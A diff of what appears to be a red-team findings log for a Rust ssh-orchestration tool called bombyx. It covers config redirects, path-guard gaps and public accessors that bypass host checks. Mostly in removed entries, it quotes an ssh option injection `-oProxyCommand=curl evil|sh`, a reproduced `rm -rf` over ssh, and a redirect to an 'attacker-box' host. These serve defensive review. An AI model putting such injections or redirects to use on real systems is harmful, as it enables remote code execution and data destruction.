@@ -2,41 +2,31 @@
 
 Security (Red Team) review findings. Newest first.
 
-
 ---
 
-### rt-2026-09-05-absolute-no-repo-file-claim-in-fourteen-places
+### rt-2026-09-06-two-program-tool-case-has-no-test
 
-**Category:** Security (threat model)
+**Category:** Test coverage declined deliberately
 
-After #18 the claim that bombyx reads no file from the project's
-directory is stated absolutely in about fourteen places --
-`README.md`, `docs/trust-boundary.md`, `docs/architecture.md`,
-`docs/tutorial.md`, `docs/vm-host-setup.md`, `llms.txt`,
-`CLAUDE.md`, the architect skill, `crates/bombyx/src/lib.rs` and
-an integration-test comment. Two arguments defeat it.
-`--config <path>` reads any file, including one committed in a
-clone; `BOMBYX_CONFIG_HOME` only has to be *anchored*, so an
-absolute path into a clone is accepted and `direnv` or `mise`
-can set it from inside one. Reproduced during the `/review2` on
-#18: a registry inside a repository, reached with
-`--config ./config.toml`, produced
-`ssh in-the-repo "rm -rf '/etc/myproject'"` silently, because
-the file-wide `host` wins and prints no notice.
+`check_not_an_option` in `crates/bombyx/src/config/guards.rs`
+takes `tool: &str` and renders it into "which {tool} would treat
+as an option". No test passes two program names any more. The
+test that did, `the_option_message_reads_the_same_for_one_tool_
+or_two`, was deleted on 2026-09-06 along with the comment citing
+it, because the comment justified the wording by that test and
+the test existed to hold the wording -- the circularity a
+fresh-reader finding was raised against.
 
-The reasoning half was fixed in that round --
-`docs/architecture.md` under **What config values are checked**
-and `docs/usage.md` under **What is checked, and what is not**
-now state the two redirect routes and say the allowlist is a
-boundary rather than a typo check. What is deferred is
-qualifying the other twelve copies, and deciding whether one of
-them owns the claim and the rest point at it.
+Declined rather than restored. The merged test asserts the whole
+message, "which ssh would treat as an option", so a rewrite to
+"reads" fails it: the wording is pinned by an assertion over a
+real caller instead of by a fictional one. All four production
+call sites pass one word, `ssh` or `git`.
 
-Deferred by the operator during that `/review2`: `/review` under
-**Review, then fix** forbids applying a consolidation of three
-or more copies in the round that finds it, and the run had
-stopped on non-convergence over this very fact. Found as RT-2 in
-round 2.
+What this leaves open: nothing refuses a future caller that
+passes two program names, and the message would read
+ungrammatically if one did. Raised as RT-11 in the `/review2` on
+the backlog sweep, 2026-09-06.
 
 ### rt-2026-09-05-load-project-option-hides-two-dead-branches
 
@@ -64,97 +54,6 @@ Deferred by the operator during the `/review2` on #18: it is a
 public-signature change proposed at the end of a review that had
 already stopped on non-convergence, and it has no user-visible
 effect. Found as RT-5 in round 2.
-
-### rt-2026-09-05-required-tables-has-two-copies
-
-**Category:** Duplication
-
-`crates/bombyx/src/config.rs` defines the `[vm]` and `[source]`
-tables twice, character for character: the `REQUIRED_TABLES`
-constant at module scope, and a `required_tables()` function in
-the file's `tests` module. `minimal()` uses the constant and
-`completed()` uses the function, so both are live. The
-constant's doc claimed every test read one copy, which was the
-claim that made the duplication a defect rather than a
-tidiness point; that claim now names the second copy instead.
-
-Deferred: deleting the function is a test-only change, and the
-operator ended this round's code changes. Found as FR-9 in the
-`/review2` on registry-config-load (#26).
-
-**Resolved 2026-09-05 by `project-selection-flag` (#18).** The
-`tests` module was rewritten onto the registry, and
-`required_tables()` and `completed()` went with the project-file
-helpers they served. One copy is left, the constant.
-
-### rt-2026-09-05-test-fixtures-sit-above-the-public-exports
-
-**Category:** Module structure
-
-Three `#[cfg(test)]` fixtures -- `REQUIRED_TABLES`,
-`test_entry` and `test_registry` -- occupy 43 lines of
-`crates/bombyx/src/config.rs` between the module declarations
-and the `pub use` block, so a reader scanning the top of the
-file for its public surface hits test scaffolding first. They
-are at module scope because two sibling test modules share
-them, which is a good reason and is now written down.
-
-Deferred: moving them is a code change and the operator ended
-this round's. Worth folding into `config-tests-own-file` in
-`docs/todo.md`, which moves the test modules out anyway. Found
-as FR-8 in the `/review2` on registry-config-load (#26).
-
-### rt-2026-09-05-registry-not-found-advises-too-little
-
-**Category:** Error messages
-
-`ConfigError::RegistryNotFound` in
-`crates/bombyx/src/config/error.rs` tells an operator with no
-registry file to "create <place> with a `[projects."<name>"]`
-table" and stops there. Its sibling `ProjectNotFound` lists the
-`.vm` and `.source` sub-tables and `remote_root` as well. The
-asymmetry is backwards: `Project` requires `vm` and `source`
-with no serde default, so an operator who follows the shorter
-advice literally writes a file bombyx then refuses for a missing
-field, and gets a third failure after that for the host. The
-variant's own doc comment claims the opposite -- "the message
-says both".
-
-Deferred: the operator ended the review round's code changes
-after the third quoting fix, and this one changes what bombyx
-prints, so it wants a failing test and a round nobody is in.
-Found as RT-11 in the `/review2` on registry-config-load
-(#26).
-
-### rt-2026-09-04-registry-host-is-pub-and-unchecked
-
-**Category:** Public surface nothing public consumes
-
-`Registry::host` is `pub` and returns a VM host that no rule has
-run on. bombyx's guarantee that a leading `-` never reaches
-`ssh` -- where `-oProxyCommand=curl evil|sh` runs code on the
-workstation -- rests on `Config::load` calling `host_problem` on
-whichever source won. A public accessor hands the unchecked
-value out past that point, so the guarantee belongs to the
-caller rather than to bombyx.
-
-The `Registry` in question was introduced in step 3 (#24) and
-nothing outside this crate calls it. Its sibling
-`Registry::project_host`, added in step 4 (#25), had the same
-shape and was narrowed to `pub(crate)` in the review round that
-raised this. `Registry::host` was left alone because it is not
-what step 4 changed, and narrowing an accessor the same round
-that adds one is the consolidation `/review` says never to apply
-in the round that found it.
-
-The fix is one word, `pub` to `pub(crate)`. It is a breaking
-library change on paper and not one in practice, because the
-type has never been released: both accessors are in the same
-unreleased cycle.
-
-Raised by red-team during the `/review2` on #25.
-
----
 
 ### rt-2026-09-04-doc-cannot-link-a-plans-own-section
 
@@ -185,36 +84,6 @@ which nothing here can check.
 Deferred: raised by red-team in round 3 of the `/review2` on #7,
 which was the three-round ceiling, so it was logged rather than
 fixed and re-reviewed.
-
-### rt-2026-09-04-doc-guard-misses-doubled-and-trailing-slash
-
-**Category:** A path guard short of the family CLAUDE.md names
-
-`DocLink::new` refuses blank, rooted, unrenderable, escaping and
-naming-no-file. `CLAUDE.md` under **Test-Driven Development**
-enumerates what a path guard should cover: "`.`, `..`, empty,
-unrooted, too shallow, doubled and trailing slash". Doubled and
-trailing slash are not covered, and nor is an interior `.`
-segment.
-
-`--doc issues//project-config-off-repo.md` and
-`--doc ./issues/../issues/project-config-off-repo.md` both pass
-every rule. `escapes_repo` skips empty and `.` components
-deliberately, and `Path::join(..).is_file()` normalises the
-doubled separator, so the existence check agrees and the written
-link keeps the odd spelling. The guard's own doc comment claims
-it "refuses every shape that would not survive the trip to
-another reader", which is one claim wider than the code.
-
-Whether a renderer resolves `docs/issues//plan.md` was not
-verified and should not be assumed. What was verified is that
-the check normalises the path and the rendered link does not.
-
-Candidate fix: refuse an empty or `.` component in
-`escapes_repo`, which costs nothing because no real target needs
-one, and add the four rows to the existing table.
-
-Deferred: round 3 of the `/review2` on #7, at the ceiling.
 
 ### rt-2026-09-04-doc-existence-check-answers-for-this-machine
 
@@ -247,36 +116,6 @@ fixed there. Every machine that has run this command is Linux,
 so the case-insensitive half has never fired; the symlink half
 needs somebody to place a symlink under `docs/` deliberately.
 
-### rt-2026-09-04-config-home-env-chooses-the-host-in-silence
-
-**Category:** A redirect on the path `destroy` uses, with no
-provenance line
-
-`BOMBYX_CONFIG_HOME` decides which directory `config.toml` is
-read from. `config_dir_from` in `crates/bombyx/src/config/host.rs`
-requires only that the value be an anchored path, so `/tmp/pwn`
-passes. A per-directory environment tool reads its settings from
-inside the clone -- `direnv` on an `.envrc`, `mise`, a CI job
-definition -- so a repository can supply that variable. The
-winning origin is then `HostOrigin::UserFile`, which `main.rs`
-deliberately does not announce, so bombyx runs against a host
-the operator never configured and prints nothing.
-
-Demonstrated during the `/review2` on #23: the variable pointed
-at a directory holding `host = "attacker-box"` produced
-`ssh attacker-box ...` with a clean stderr. `destroy` is the one
-command that still shows it, in the `host:directory` line it
-asks the operator to confirm.
-
-Candidate fix: print the provenance line for `UserFile` too
-whenever `CONFIG_DIR_ENV` supplied the directory. That changes
-what bombyx prints, so it needs a failing test first.
-
-Deferred: the prose asserting the opposite was corrected in the
-same change; the code was not. Also tracked as
-`config-home-env-provenance` in `docs/todo.md`, because it is
-work somebody will pick up rather than only a record.
-
 ### rt-2026-09-04-provenance-line-names-the-default-filename
 
 **Category:** Misleading provenance on the path `destroy` uses
@@ -308,87 +147,6 @@ returns the path from `Config::load`, so `main.rs` never calls
 that module, so the narrowing is free to go ahead. Only the
 alternative fix, resolving the path in `main.rs`, would need
 `local_config_path` to stay `pub`.
-
-**Closed 2026-09-04 by #23.** `bombyx.local.toml` is gone, so
-nothing in bombyx reaches the code this describes.
-
-### rt-2026-09-04-a-malformed-overlay-defeats-the-host-flag
-
-**Category:** The documented escape hatch stops working
-
-`Config::load` in `crates/bombyx/src/config.rs` reads and
-parses `bombyx.local.toml` before `resolve_host` runs, and any
-problem with it is fatal. So `--host explicit` fails on a file
-whose only contribution was already outranked. The same doc
-comment states the opposite principle two paragraphs up for the
-per-developer file: it is read only when nothing else supplied
-a host, "so `--host` still works on a machine whose
-per-developer file is missing or broken". The eager read was
-justified while the overlay carried project fields that were
-needed regardless, and step 1 removed them.
-
-Verified against the built binary: with `remote_root` in the
-overlay, `bombyx --config staging.toml --host explicit
---dry-run status` exits 1. Anyone upgrading with an existing
-overlay carrying a project field loses every command until they
-edit that file by hand.
-
-The fix is to read the overlay lazily, behind the flag and
-environment checks. The tradeoff is that a corrupt overlay then
-goes unreported whenever a higher-precedence source won.
-
-Deferred by the operator: step 2 (#23) deletes the file and the
-branch.
-
-**Closed 2026-09-04 by #23.** `bombyx.local.toml` is gone, so
-nothing in bombyx reaches the code this describes.
-
-### rt-2026-09-04-overlay-and-local-config-path-are-pub
-
-**Category:** Public surface nothing public consumes
-
-`Overlay` is `pub` with a `pub host` field, and
-`crates/bombyx/src/config.rs` re-exports
-`read::local_config_path`. Both were public because
-`Config::with_overlay` and the deleted "overrides" notice used
-them; neither exists now. `resolve_host` is `pub(crate)` and
-`Config::load` builds the `Overlay` internally, so no public
-API accepts, returns or hands out one. `Overlay`'s `Default`
-derive lost its last caller with the test that used
-`..Overlay::default()`.
-
-Narrowing both to `pub(crate)` is a breaking library change and
-would stop `Config::load`'s doc comment linking them, since
-rustdoc refuses a public page pointing at a private item.
-
-Nothing blocks this. Step 2 (#23) makes it moot if that lands
-first, which is the likely outcome.
-
-**Closed 2026-09-04 by #23.** `bombyx.local.toml` is gone, so
-nothing in bombyx reaches the code this describes.
-
-### rt-2026-09-04-a-committed-overlay-redirects-every-ssh
-
-**Category:** Residual exposure in the config path
-
-`bombyx.local.toml` sits inside the project directory, only
-convention keeps it out of git, and it outranks the operator's
-own `config.toml`. A repository that commits one redirects
-every `ssh` bombyx runs, `destroy` included, to a machine of
-its choosing. That is the attack `host` was removed from
-`bombyx.toml` to prevent, and removing it from that file did
-not close this route.
-
-bombyx does not refuse such a file. Its only mitigation is the
-provenance line, which
-`rt-2026-09-04-provenance-line-names-the-default-filename`
-shows can name the wrong file. `docs/usage.md` now states the
-exposure rather than implying it is closed.
-
-Candidate fixes: refuse an overlay that `git` tracks, or
-require the file outside the checkout. Step 2 (#23) deletes the
-file, which closes this too -- so the value here is the record
-of why the file must not come back.
 
 **Closed 2026-09-04 by #23.** `bombyx.local.toml` is gone, so
 nothing in bombyx reaches the code this describes.
@@ -512,17 +270,6 @@ port, so the test still inherits a `Host *` `ProxyCommand` on Linux
 and macOS.
 
 A stub `ssh` first on `PATH` is the lever that works on both.
-
-### rt-2026-09-02-three-comments-still-describe-the-push
-
-**Category:** Stale prose about a removed capability
-
-`remote/probe.rs` says `up` "creates the remote directory and ships a
-tarball before `vagrant` fails"; `config/root.rs` justifies its depth
-rule with `up` extracting "a tarball into `/etc`"; `remote/quote.rs`
-explains a quoting rule with `scp` writing to the real home
-directory. All three state current behaviour and all three are
-false. Three sweeps missed them.
 
 ### rt-2026-08-31-chmod-symlink-race
 
